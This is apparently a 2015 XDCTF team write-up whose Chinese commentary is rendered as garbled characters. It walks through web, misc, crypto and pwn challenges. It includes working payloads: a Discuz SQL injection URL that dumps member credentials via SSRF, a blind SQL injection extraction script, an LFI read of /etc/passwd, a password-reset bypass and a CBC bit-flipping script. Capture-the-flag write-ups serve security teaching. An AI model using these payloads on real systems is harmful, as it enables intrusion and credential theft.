# XDCTF-WriteUp TEAM:�����������͵�

��ǩ���ո�ָ����� XDCTF writeup

---
##WEB1
###WEB1-100
������վԴ�룺
http://133.130.90.172/5008e9a6ea2ab282a9d646befa70d53a/index.php~
www.phpjm.net ���ܺ��php�ļ������ܺ�Ĵ���Ϊ��
```php:n
<?php
$test=$_GET['test']; 
$test=md5($test); 
if($test=='0') 
{ 
	print "flag{xxxxxx}"; 
} 
else print "you are falied!"; 
print $test; 
echo "tips:֪��ԭ���ˣ��벻�ڵ��ȷ����������²��ԣ��ڱ��ز��Ժã��ڴ˲���poc���ɣ��������Ը�"; 
?>
```
����md5($test)=0exxxxx  xxxΪ���֣������ƹ���googleһ�£����ֳɵģ�
```bash:n
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -
$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -
$ echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  -
```
�ύ���ɵõ�flag

###WEB1-200
��ַ�ǣ�http://flagbox-23031374.xdctf.win:1234/
��½ҳ���ǣ�http://flagbox-23031374.xdctf.win:1234/examples/
ɨ����Ŀ¼�����֣�http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
tomcat��SessionExample,��������α������session��½ҳ���ˣ������޸�
```
Session ID: E528F4CE77E6E89A44D6EE518DE32011 
Created: Sat Oct 03 18:47:15 JST 2015
Last Accessed: Sat Oct 03 18:48:31 JST 2015
The following data is in your session:
user = Administrator
logIn = true
```
�ٴη��ʵ�½ҳ��,���flag

###WEB1-300
��ַ��http://133.130.90.188/
��������е���˼��������ҳ��LFI��ssrf:
��passwd�ļ���
```:n
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:105:112::/home/ntp:/bin/false
mysql:x:1000:1000::/home/mysql:/sbin/nologin
www:x:1001:1001::/home/www:/sbin/nologin
```
��Ϊ��ҪLFI getshell�����˸��ַ��������У�Ȼ�����Index.php��Դ�뿴���£�
```php:n
 <?php
    if (isset($_GET['link'])) {
        $link = $_GET['link'];
        // disable sleep
        if (strpos(strtolower($link), 'sleep') || strpos(strtolower($link), 'benchmark')) {
            die('No sleep.');
        }
        if (strpos($link,"http://") === 0) {
            // http
            $curlobj = curl_init($link);
            curl_setopt($curlobj, CURLOPT_HEADER, 0);
            curl_setopt($curlobj, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
            curl_setopt($curlobj, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($curlobj, CURLOPT_TIMEOUT, 5);
            $content = curl_exec($curlobj);
            curl_close($curlobj);
            echo $content;

        } elseif (strpos($link,"file://") === 0) {
            // file
            echo file_get_contents(substr($link, 7));
        }
    } else {
        echo<<<EOF
		<!--���ɶ-->
        <br><br><br>
        <center>
        <h1>What do you want to read?</h1>
        <form method="GET" action="#">
        <input style="width:300px; height:25px;" name="link" value="" /> 
        <button style="height:25px;" type="submit">Read</button>
        </form>
        </center>
EOF;
    }
?>
```
������Ϲ�ң���/etc/hosts���濴���ö�����
```n
127.0.0.1	localhost
127.0.1.1	ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1	9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com
```
���passwd�ļ�����������webĿ¼,���ȱ���ֱ�ӷ���9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com �޷����ʣ�����ҳ���ȡ���ֺ���ҳ��һ���ģ�Ȼ������burp������һ�¶˿�
133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:xxxx
����3389�˿�������һ��web������һ��dz 7.2��վ��������dz fap.php ��exp���ϴ�
```n
http://133.130.90.188/?link=http%3A%2f%2f9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com%3A3389%2ffaq.php%3Faction%3Dgrouppermission%26gids%5B99%5D%3D%2527%26gids%5B100%5D%5B0%5D%3D%29%2520and%2520%28select%25201%2520from%2520%28select%2520count%28%2a%29%2Cconcat%28%28select%2520%28select%2520%28select%2520concat%28username%2C0x27%2Cpassword%29%2520from%2520cdb_members%2520limit%25201%29%2520%29%2520from%2520%60information_schema%60.tables%2520limit%25200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%2520from%2520information_schema.tables%2520group%2520by%2520x%29a%29%2523
```
�����Ĺ���Ա���������flag

###WEB1-400
����ҳ�淢����ҳ��ͼƬ�е���֣�
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php
��Ȼ��һ��php�ļ��������������򿪷����ļ���β�У�
```n
<!--Please input the ID as parameter with numeric value-->
```
Ŀ��Ӧ����ע�룬һ��ʼ���˰���ɶҲû�ã���������hint��ʾ",������bool blind sql injection:
```n
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=11111111%22%20or%201=1%23  true
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=11111111%22%20or%201=2%23  false
```
����äע��ʱ���ָ��ֺ��������ˣ������rpad����ʹ�ã�д�˸��ű���һ�£�
```python:n
__author__ = 'F4nt45i4-kow'
import urllib
payloads = list('0123456789abcdefghijklmnopqrstuvwxyz@_./:')
c = ''
for i in range(1,35):
    for payload in payloads:
        url = 'http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID='
        a = c + payload
        pay1 = '11" or if(rpad((Password),%s,1)=\'%s\',1,0)#' % (i,a)
        pay = urllib.quote(pay1)
        url = url + pay
        f = urllib.urlopen(url)
        s = f.read()
        if(len(s) == 25938):
            c += payload
            a = ''
            #print i,':',payload
            print i,':',c
            break
```
������һ�㣬��Ϊע�����û�����Ϣ��ͬһ�����У��Ͳ���Ҫselect * from���в�ѯ�ˣ�ֱ�����ֶ������в�ѯ�Ϳ����ˣ����￨�˺ó�ʱ�䣩
�����˺�����Ϊ��
```n
username=admin
password=5832f4251cb6f43917df
```
���ܺ��������20λ��hash�����ݶ���ߣվ���飬��dedecms��hash��һ���ģ�ȥ��ǰ����һ�ŵ�cmd5�ϵõ����룺lu5631209
Ȼ���½���õ�flag

##WEB2
##WEB2-200
ʹ��rip-git.pl
`./rip-git.pl -v -u http://xdsec-cms-12023458.xdctf.win/.git/`
`git log`һ�� ����֮ǰ��commit
`git reset --hard d16ecb17678b0297516962e2232080200ce7f2b3`���ɿ���Դ��
��index.php���ҵ�flag��
##WEB2-100
������Ĵ�����resetpwd�ĵط���
```php:n
public function handle_resetpwd()
    {
        if(empty($_GET["email"]) || empty($_GET["verify"])) {
            $this->error("Bad request", site_url("auth/forgetpwd"));
        }
        $user = $this->user->get_user(I("get.email"), "email");
        if(I('get.verify') != $user['verify']) {
            $this->error("Your verify code is error", site_url('auth/forgetpwd'));
        }
        if($this->input->method() == "post") {
            $password = I("post.password");
            if(!$this->confirm_password($password)) {
                $this->error("Confirm password error");
            }
            if(!$this->complex_password($password)) {
                $this->error("Password must have at least one alpha and one number");
            }
            if(strlen($password) < 8) {
                $this->error("The Password field must be at least 8 characters in length");
            }
            $this->user->update_userinfo([
                "password" => $password,
                "verify" => null
            ], $user["uid"]);
            $this->success("Password update successful!", site_url("auth/login"));
        } else {
            $url = site_url("auth/resetpwd") . "?email={$user['email']}&verify={$user['verify']}";
            $this->view("resetpwd.html", ["form_url" => $url]);
        }
    }
```
�ƹ�`I('get.verify') != $user['verify']`����֤���ɣ�����ͨ����������verify[]=1�������ƹ�
����:
`http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&verify[]=1`
ץ�����ù�������룬��¼�����ϴ����ļ��л��flag

##MISC
###MISC100
��png��IDAT��ѹ�������Կ�����ɫƽ����������Ϣ���ýű���ȡ�����󣬰������¶�Ӧ��ϵ��
`(R*65536+G*256+B) % 11`
��`0-7`�ֱ��滻��`brainfuck`������`><+-.,[]`Ȼ��ִ�еõ�flag
###MISC200
���⿼������Ѿ�֪��ĳ��ѹ���������ģ��������һ��ѹ�����ļ����ļ���
`http://blog.csdn.net/jiangwlee/article/details/6911087`
�������з����ƽ�zip�õ�flag

##CRYPT
###CRYPT200
pbiernat/BlackBoxChal2��ԭ�⣬д���ű���һ�£�
```python:n
__author__ = 'F4nt45i4-nlfox'
import socket
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('133.130.52.128',6666))
buf=4096
sock.send('mkprof:Xadmin=true')
data = sock.recv(buf)
print data
ct = data[:-1].decode('hex')
l = list(ct)
l[16] = chr(ord(l[16]) ^ ord('X') ^ ord(';'))
ct = ''.join(l)
print ct.encode('hex')
sock.send('parse:'+ct.encode('hex'))
print sock.recv(buf)
```
###CRYPT300
ԭ�⣺`https://stratum0.org/blog/posts/2013/09/23/csaw2013-slurp/`

##REVERSE
###REVERSE100
###REVERSE200
###REVERSE500

##PWN
###PWN100
ͨ�������������ж�ΪCVE-2012-0158��POC����������֮����windbg��������flag�ַ���
###PWN300
###PWN400



